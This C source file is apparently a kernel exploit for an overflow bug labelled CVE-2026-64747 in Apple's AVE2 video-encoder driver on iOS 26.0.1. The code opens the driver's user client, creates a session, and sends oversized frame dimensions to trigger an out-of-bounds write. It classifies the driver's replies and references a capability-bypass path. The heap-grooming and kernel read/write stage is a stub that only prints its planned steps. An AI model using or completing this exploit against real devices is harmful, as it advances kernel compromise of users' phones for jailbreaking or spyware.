/*
 * ave2_krw.c — CVE-2026-64747 krw KRW 利用
 *
 * 目标：iPhone12,1 (A13/arm64e) / iOS 26.0.1 / AppleAVE2 904.76.7 (vulnerable)
 *
 * 原理：
 *   1. IOServiceOpen(type=1) 打开 AppleAVE2UserClient
 *   2. sel1 create session (0x920-byte struct)
 *   3. sel4 configure (0x1a0a0-byte struct) 注入溢出 dims (64656x8080)
 *   4. 32-bit LRB 计算器溢出 → sign bit set → undersized DART buffer → OOB write
 *   5. 堆 groom + 对象污染 → kread64/kwrite64/kernel_base 原语
 *
 * 当前阶段：溢出触发验证（Phase 1）
 *   验证：配置后设备 panic 或 kernel log 出现 LRB overflow 迹象
 *
 * 编译：
 *   clang -O0 -g -arch arm64e -framework IOKit -framework CoreFoundation \
 *         -o ave2_krw ave2_krw.c -DKRW_PHASE_1
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

#include "ave2_wire.h"

/* ------------------------------------------------------------------ */
/* 常量                                                                */
/* ------------------------------------------------------------------ */

#define AVE2_VERSION_VULN   "904.76.7"   /* 设备实测 vulnerable 版本 */
#define AVE2_VERSION_FIXED  "905.40.1"   /* 修复版（仅作对照） */

/* 溢出触发 dims (FIRE_READY.md §3 验证) */
#define AVF_W_LRB           64656
#define AVF_H_LRB           8080
#define AVF_W_CLAMP_CTRL    65520
#define AVF_H_CLAMP_CTRL    8193

/* mode-5 参数 (p6=2, p8=10, p9=0) */
#define AVF_P6_CHROMA       2
#define AVF_P8_BITDEPTH     10
#define AVF_P9FLAG_BIT0     0

/* iNumViews/iNumLayers 必须为 {1,2} */
#define AVF_NUMVIEWS        1
#define AVF_NUMLAYERS       1

/* ------------------------------------------------------------------ */
/* 工具函数                                                            */
/* ------------------------------------------------------------------ */

static const char *kr_name(kern_return_t kr) {
    switch (kr) {
        case KERN_SUCCESS:         return "KERN_SUCCESS";
        case kIOReturnError:       return "kIOReturnError";
        case kIOReturnNoMemory:    return "kIOReturnNoMemory";
        case kIOReturnBadArgument: return "kIOReturnBadArgument";
        case kIOReturnUnsupported: return "kIOReturnUnsupported";
        case kIOReturnNotAttached: return "kIOReturnNotAttached";
        case kIOReturnNotPrivileged: return "kIOReturnNotPrivileged";
        case kIOReturnNoDevice:    return "kIOReturnNoDevice";
        case kIOReturnInternalError: return "kIOReturnInternalError";
        case kIOReturnVMError:     return "kIOReturnVMError";
        default:                   return "kIOReturn?";
    }
}

static void dump_buf_hex(const char *tag, const void *buf, size_t len, size_t max_lines) {
    const uint8_t *b = (const uint8_t *)buf;
    size_t lines = len / 16;
    if (lines > max_lines) lines = max_lines;
    printf("  %s (showing %zu/%zu lines):\n", tag, lines, len / 16);
    for (size_t i = 0; i < lines; i++) {
        printf("    %04zx: ", i * 16);
        for (size_t j = 0; j < 16; j++) {
            printf("%02x ", b[i * 16 + j]);
        }
        printf(" |");
        for (size_t j = 0; j < 16; j++) {
            uint8_t c = b[i * 16 + j];
            printf("%c", (c >= 32 && c < 127) ? (char)c : '.');
        }
        printf("|\n");
    }
}

/* ------------------------------------------------------------------ */
/* Phase 1: 溢出触发验证                                               */
/* ------------------------------------------------------------------ */

static int phase1_overflow_trigger(io_connect_t conn, io_service_t service) {
    printf("\n=== Phase 1: LRB Overflow Trigger ===\n");

    /* --- Step 1: session create (sel1, 0x920 bytes) --- */
    static uint8_t cbuf[AVE2_CREATE_IN_SIZE];
    uint8_t cout[AVE2_CREATE_OUT_SIZE];
    uint64_t session_cookie = 0, cookie_id = 0;

    const char *ver = getenv("AVE2_VERSION");
    if (!ver) ver = AVE2_VERSION_VULN;

    for (int variant = 0; variant < 2; variant++) {
        for (uint32_t enc = 1; enc <= 3; enc++) {
            memset(cbuf, 0, sizeof(cbuf));
            memset(cout, 0, sizeof(cout));

            /* version gate: must match device kext */
            memcpy(cbuf + AVE2_CREATE_OFF_VERSION, ver,
                   strlen(ver) < 8 ? strlen(ver) : 8);

            /* encType >= 1 */
            *(int32_t *)(cbuf + AVE2_CREATE_OFF_ENCTYPE) = (int32_t)enc;

            /* log level >= 1, count > 0 */
            *(int32_t *)(cbuf + 0x910) = 1;
            *(int32_t *)(cbuf + 0x914) = 1;

            /* monotonic log index */
            *(uint64_t *)(cbuf + 0x808) = 0x100000 + variant * 0x100 + enc;

            size_t cosz = AVE2_CREATE_OUT_SIZE;
            kern_return_t ckr = IOConnectCallStructMethod(conn, AVE2_SEL_CREATE,
                                                          cbuf, sizeof(cbuf),
                                                          cout, &cosz);
            uint32_t cstatus = cosz >= 0x1c ? *(uint32_t *)(cout + 0x18) : 0xdeadbeef;

            printf("  [create v%d enc=%u] ver=%s trap=0x%08x status=0x%08x\n",
                   variant, enc, ver, ckr, cstatus);

            if (cosz >= 0x1c) {
                session_cookie = *(uint64_t *)(cout + 0x00);
                cookie_id      = *(uint64_t *)(cout + 0x20);
                printf("    cookie=0x%016llx id=0x%016llx\n",
                       (unsigned long long)session_cookie,
                       (unsigned long long)cookie_id);
            }

            if (ckr == KERN_SUCCESS && cstatus == 0) {
                printf("  [+] SESSION CREATED\n");
                goto session_ok;
            }
        }
    }
    printf("  [-] session create FAILED\n");
    return -1;

session_ok:

    /* --- Step 2: configure with overflowing dims (sel4, 0x1a0a0 bytes) --- */
    static uint8_t cmdbuf[AVE2_INBUF_MIN];
    uint8_t fout[0x20];

    /* 设置溢出 dims 或控制 dims (env AVF_MODE) */
    int use_overflow = getenv("AVF_OVERFLOW") ? 1 : 0;
    uint32_t dw = use_overflow ? AVF_W_LRB : AVF_W_CLAMP_CTRL;
    uint32_t dh = use_overflow ? AVF_H_LRB : AVF_H_CLAMP_CTRL;

    printf("  [configure] mode=%s dims=%ux%u product=0x%llx\n",
           use_overflow ? "OVERFLOW" : "CLAMP-CTRL",
           dw, dh, (unsigned long long)dw * dh);

    memset(cmdbuf, 0, sizeof(cmdbuf));

    /* common params gate: s64 @ +0x10/+0x18/+0x20 >= 0 */
    *(int64_t *)(cmdbuf + 0x10) = 0;
    *(int64_t *)(cmdbuf + 0x18) = 0;
    *(int64_t *)(cmdbuf + 0x20) = 0;

    /* configure fields */
    *(int32_t *)(cmdbuf + AVE2_OFF_PRIORITY)  = 0;
    *(int32_t *)(cmdbuf + AVE2_OFF_WIDTH)     = (int32_t)dw;
    *(int32_t *)(cmdbuf + AVE2_OFF_HEIGHT)    = (int32_t)dh;
    *(uint32_t *)(cmdbuf + AVE2_OFF_SLICES)   = 1;
    *(int32_t *)(cmdbuf + AVE2_OFF_ENCTYPE)   = 1;

    /* mode-5 / HEVC 10-bit knobs */
    *(int32_t *)(cmdbuf + AVE2_MODE5_OFF_P6)      = AVF_P6_CHROMA;
    *(int32_t *)(cmdbuf + AVE2_MODE5_OFF_P8)      = AVF_P8_BITDEPTH;
    *(uint8_t *)(cmdbuf + AVE2_MODE5_OFF_P9FLAG)  = AVF_P9FLAG_BIT0;

    /* codec-info gates */
    *(int32_t *)(cmdbuf + AVE2_OFF_NUMVIEWS)   = AVF_NUMVIEWS;
    *(int32_t *)(cmdbuf + AVE2_OFF_NUMLAYERS)  = AVF_NUMLAYERS;

    /* 异步调用 (fixed kext 的 IO_Config gate 要求 asyncWakePort != NULL) */
    mach_port_t wake = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake) != KERN_SUCCESS) {
        printf("  [-] mach_port_allocate failed\n");
        return -1;
    }

    size_t fosz = sizeof(fout);
    memset(fout, 0, sizeof(fout));

    io_async_ref64_t aref;
    memset(aref, 0, sizeof(aref));
    aref[0] = (uint64_t)wake;

    kern_return_t fkr = IOConnectCallAsyncStructMethod(
        conn, AVE2_SEL_CONFIGURE, wake, aref, 1,
        cmdbuf, sizeof(cmdbuf), fout, &fosz);

    uint32_t fstatus = fosz >= 0x1c ? *(uint32_t *)(fout + 0x18) : 0xdeadbeef;

    printf("  [configure] trap=0x%08x (%s) status=0x%08x\n",
           fkr, kr_name(fkr), fstatus);

    if (fosz >= 0x1c) {
        printf("  [out] echo0=0x%016llx echo1=0x%016llx echo2=0x%016llx\n",
               (unsigned long long)*(uint64_t *)(fout + 0x0),
               (unsigned long long)*(uint64_t *)(fout + 0x8),
               (unsigned long long)*(uint64_t *)(fout + 0x10));
    }

    mach_port_destroy(mach_task_self(), wake);

    /* --- Step 3: 结果分类 --- */
    printf("\n  === CLASSIFICATION ===\n");
    printf("  session-created: %s\n", session_cookie ? "YES" : "NO");

    if (use_overflow) {
        if (fkr == KERN_SUCCESS || fstatus == 0) {
            printf("  OVERFLOW-SUCCESS: configure 返回成功，LRB 溢出可能已触发\n");
            printf("    下一步：检查设备是否 panic，kernel log 是否有 OOB 迹象\n");
        } else if ((uint32_t)fkr == 0xfffffc17 || fstatus == 0xfffffc17) {
            printf("  CLAMP-REJECTED: 能力表 gate 拒绝了溢出 dims\n");
            printf("    → 需要 FIRE_READY.md §6 的 capability-bypass 路径\n");
        } else if ((uint32_t)fkr == 0xfffffc0d || fstatus == 0xfffffc0d) {
            printf("  WRONG-STATE: session 未正确关联到 selector path\n");
        } else {
            printf("  UNKNOWN: 需要进一步分析返回码\n");
        }
    } else {
        printf("  CLAMP-CONTROL: 控制 dims 应触发修复版 product clamp\n");
        printf("    (vulnerable 904.76.7 无此 clamp → 应继续深入)\n");
    }

    return 0;
}

/* ------------------------------------------------------------------ */
/* Phase 2: KRW 原语封装 (占位，Phase 1 验证后实现)                    */
/* ------------------------------------------------------------------ */

static int phase2_krw_primitives(io_connect_t conn) {
    printf("\n=== Phase 2: KRW Primitives (NOT YET IMPLEMENTED) ===\n");
    printf("  需要 Phase 1 溢出触发验证后，才能确定堆污染策略。\n");
    printf("  计划步骤：\n");
    printf("    1. 确认溢出写入位置 (DART/IOMMU buffer 越界)\n");
    printf("    2. 堆 groom 使溢出目标落在可控对象上\n");
    printf("    3. 污染对象指针 → kread64/kwrite64\n");
    printf("    4. 封装 kernel_base + krw_read64/write64 接口\n");
    return -1;
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("=== CVE-2026-64747 krw KRW Exploit (iOS 26.0.1 / AVE2 904.76.7) ===\n");

    /* Step 1: locate service */
    CFMutableDictionaryRef matching = IOServiceMatching("AppleAVE2Driver");
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, matching);
    if (!service) {
        printf("[-] AppleAVE2Driver service NOT FOUND\n");
        printf("    可能原因：设备无 AVE2 硬件 / kext 未加载\n");
        return 1;
    }
    printf("[+] AppleAVE2Driver found: 0x%x\n", service);

    /* Step 2: open user client */
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 1, &conn);
    if (kr != KERN_SUCCESS) {
        printf("[-] IOServiceOpen(type=1) failed: 0x%08x (%s)\n", kr, kr_name(kr));
        IOObjectRelease(service);
        return 2;
    }
    printf("[+] AppleAVE2UserClient OPENED (type=1, conn=0x%x)\n", conn);

    /* Step 3: Phase 1 — overflow trigger */
    int r1 = phase1_overflow_trigger(conn, service);

    /* Step 4: Phase 2 — KRW primitives (占位) */
    int r2 = phase2_krw_primitives(conn);

    /* cleanup */
    IOServiceClose(conn);
    IOObjectRelease(service);

    printf("\n=== DONE (Phase1=%d, Phase2=%d) ===\n", r1, r2);
    return (r1 == 0) ? 0 : 1;
}
